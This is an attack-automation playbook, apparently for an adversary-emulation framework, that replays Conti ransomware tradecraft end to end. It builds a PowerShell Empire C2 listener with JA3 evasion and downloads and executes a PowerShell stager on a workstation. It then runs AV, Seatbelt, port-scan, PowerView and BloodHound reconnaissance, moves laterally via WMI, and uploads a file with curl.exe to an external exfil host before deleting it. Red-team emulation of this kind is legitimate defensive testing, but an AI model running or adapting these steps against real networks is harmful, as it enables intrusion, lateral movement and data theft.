# Conti Ransomware Playbook

local "function" "now" {
    function_name = "timestamp"
}

local "function" "date_stamp" {
    function_name       = "formatdate"
    function_parameters = ["%m_%d_%Y_%H_%M", local.function.now]
}

local "function" "stager_decode" {
    function_name       = "base64decode"
    function_parameters = [resource.task.c2_task.stager.Output]
}

variable "public_cidr" {
    description = "Public address range. Restrict access to ./HAVOC resources to this IP range."
}

variable "private_cidr" {
    description = "Private address range. Scanning modules will scan this IP range."
}

variable "domain_name" {
    description = "The domain name to be associated with the external facing listeners."
}

variable "exfil_file" {
    description = "File name to use for the exfil file."
    default     = "exfil_file.txt"
}

variable "exfil_path" {
    description = "Path where the exfil file will be generated and uploaded from."
    default     = "%USERPROFILE%"
}

variable "exfil_size" {
    description = "Size of the exfil file to generate in megabytes."
    default     = "1000"
}

variable "scan_ports" {
    description = "Range of ports to be scanned by the port scan module."
    default     = "1-3500"
}

variable "initial_access_task_name" {
    description = "The name of the remote task where the C2 implant should run."
    default     = "workstation_host"
}

variable "lateral_movement_task_name" {
    description = "The name of the remote task that should be targeted by the lateral movement module."
    default     = "server_host"
}

data "tasks" "initial_access_task" {
  task_name = variable.initial_access_task_name
}

data "tasks" "lateral_movement_task" {
  task_name  = variable.lateral_movement_task_name
}

resource "random_string" "random_6" {
  length           = 6
  special          = false
}

resource "random_string" "random_32" {
  length           = 32
  special          = false
}

resource "portgroup" "c2_portgroup" {
    portgroup_name = "c2_portgroup_${local.function.date_stamp}"
    ip_ranges      = variable.public_cidr
    port           = "443"
    ip_protocol    = "tcp"
}

resource "portgroup" "http_portgroup" {
    portgroup_name = "http_portgroup_${local.function.date_stamp}"
    ip_ranges      = variable.public_cidr
    port           = "443"
    ip_protocol    = "tcp"
}

resource "portgroup" "exfil_portgroup" {
    portgroup_name = "exfil_portgroup_${local.function.date_stamp}"
    ip_ranges      = variable.public_cidr
    port           = "443"
    ip_protocol    = "tcp"
}

resource "task" "c2_task" {
    task_type  = "powershell_empire"
    task_name  = "c2_task_${local.function.date_stamp}"

    listener {
        http_malleable {
            Profile     = "trevor.profile"
            Host        = "https://c2-${resource.random_string.random_6.result}.${variable.domain_name}:443"
            Port        = "443"
            CertPath = "/opt/Empire/empire/server/data/"
            StagingKey  = resource.random_string.random_32.result
            JA3_Evasion = "True"
        }
        tls {
            cert_type = "self-signed"
            cert_country = "US"
            cert_state = "California"
            cert_locale = "San Francisco"
            cert_org = "Havoc Inc."
            cert_org_unit = "IT Security"
            cert_host = "local_ip"
        }
    }

    stager {
        Listener   = "http_malleable"
        StagerName = "multi/launcher"
        Language   = "powershell"
        OutFile    = "launcher.ps1"
    }
}

resource "listener" "c2_listener" {
    listener_name = "c2_listener_${local.function.date_stamp}"
    listener_type = "HTTPS"
    listener_port = "443"
    task_name     = resource.task.c2_task.task_name
    portgroups    = [resource.portgroup.c2_portgroup.portgroup_name]
    host_name     = "c2-${resource.random_string.random_6.result}"
    domain_name   = variable.domain_name
}

resource "task" "http_task" {
    task_type  = "http_server"
    task_name  = "http_task_${local.function.date_stamp}"

    listener {
        https {
            Port = "443"
        }
        tls {
            cert_type = "self-signed"
            cert_country = "US"
            cert_state = "California"
            cert_locale = "San Francisco"
            cert_org = "Havoc Inc."
            cert_org_unit = "IT Security"
            cert_host = "local_ip"
        }
    }
}

resource "listener" "http_listener" {
    listener_name = "http_listener_${local.function.date_stamp}"
    listener_type = "HTTPS"
    listener_port = "443"
    task_name     = resource.task.http_task.task_name
    portgroups    = [resource.portgroup.http_portgroup.portgroup_name]
    host_name     = "downloads-${resource.random_string.random_6.result}"
    domain_name   = variable.domain_name
}

resource "task" "exfil_task" {
    task_type  = "exfilkit"
    task_name  = "exfil_task_${local.function.date_stamp}"

    listener {
        https {
            Port = "443"
        }
        tls {
            cert_type = "self-signed"
            cert_country = "US"
            cert_state = "California"
            cert_locale = "San Francisco"
            cert_org = "Havoc Inc."
            cert_org_unit = "IT Security"
            cert_host = "local_ip"
        }
    }
}

resource "listener" "exfil_listener" {
    listener_name = "exfil_listener_${local.function.date_stamp}"
    listener_type = "HTTPS"
    listener_port = "443"
    task_name     = resource.task.exfil_task.task_name
    portgroups    = [resource.portgroup.exfil_portgroup.portgroup_name]
    host_name     = "uploads-${resource.random_string.random_6.result}"
    domain_name   = variable.domain_name
}

resource "file" "stager_upload" {
    file_name     = resource.task.c2_task.stager.OutFile
    file_contents = local.function.stager_decode
}

action "download_from_workspace" "stager_download" {
    task_name = resource.task.http_task.task_name
    file_name = resource.file.stager_upload.file_name
}

action "task_download_file" "download_stager" {
    task_name    = data.tasks.initial_access_task.task_name
    url          = "https://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}/${action.download_from_workspace.stager_download.file_name}"
    file_name    = action.download_from_workspace.stager_download.file_name
}

action "task_execute_command" "execute_stager" {
    depends_on  = resource.listener.c2_listener.listener_name
    task_name   = data.tasks.initial_access_task.task_name
    command     = "powershell.exe arsenal\${action.task_download_file.download_stager.file_name}"

    action_function {
        wait_for_c2 {
            task_name  = resource.task.c2_task.task_name
        }
    }
}

action "execute_agent_module" "antivirusproduct" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/host/antivirusproduct"
    wait_for_results  = true
    completion_string = "completed"
}

action "execute_agent_module" "dnsserver" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/host/dnsserver"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.antivirusproduct
}

action "execute_agent_module" "get_proxy" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/host/get_proxy"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.dnsserver
}

action "execute_agent_module" "get_uaclevel" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/host/get_uaclevel"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.get_proxy
}

action "execute_agent_module" "seatbelt_user" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/host/seatbelt"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.get_uaclevel

    module_args = {
        Group = "User"
        Full  = "False"
    }
}

action "execute_agent_module" "seatbelt_system" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/host/seatbelt"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.seatbelt_user

    module_args = {
        Group = "System"
        Full  = "False"
    }
}

action "execute_agent_module" "reverse_dns" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/network/reverse_dns"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.seatbelt_system

    module_args = {
        CIDR = variable.private_cidr
    }
}

action "execute_agent_module" "portscan" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/network/portscan"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.reverse_dns

    module_args = {
        Hosts = variable.private_cidr
        Ports = variable.scan_ports
    }
}

action "execute_agent_module" "get_domain_controller" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/network/powerview/get_domain_controller"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.portscan
}

action "execute_agent_module" "get_domain_policy" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/network/powerview/get_domain_policy"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.get_domain_controller
}

action "execute_agent_module" "bloodhound" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/situational_awareness/network/bloodhound"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.get_domain_policy

    module_args = {
        CollectionMethod = "Default"
        Threads          = 20
        Throttle         = 1000
    }
}

action "execute_agent_module" "invoke_wmi" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    module            = "powershell/lateral_movement/invoke_wmi"
    wait_for_results  = true
    completion_string = "completed"
    depends_on        = action.execute_agent_module.bloodhound

    module_args = {
        ComputerName = data.tasks.lateral_movement_task.host_name
        Listener     = resource.task.c2_task.listener.listener_type
    }
}

action "execute_agent_shell_command" "create_exfil_file" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    command           = "New-Item ${variable.exfil_path}\\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){\"1234567890qwertyasdfjkl;\"*1048576 >> ${variable.exfil_path}\\${variable.exfil_file}}"
    depends_on        = action.execute_agent_module.invoke_wmi
}

action "execute_agent_shell_command" "upload_exfil_file" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    command           = "c:\\Windows\\System32\\curl.exe -k -F file=@${variable.exfil_path}\\${variable.exfil_file} https://${resource.listener.exfil_listener.host_name}.${resource.listener.exfil_listener.domain_name}:443/p"
    wait_for_results  = true
    depends_on        = action.execute_agent_shell_command.create_exfil_file
}

action "execute_agent_shell_command" "delete_exfil_file" {
    task_name         = resource.task.c2_task.task_name
    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
    command           = "del ${variable.exfil_path}\\${variable.exfil_file}"
    wait_for_results  = true
    depends_on        = action.execute_agent_shell_command.upload_exfil_file
}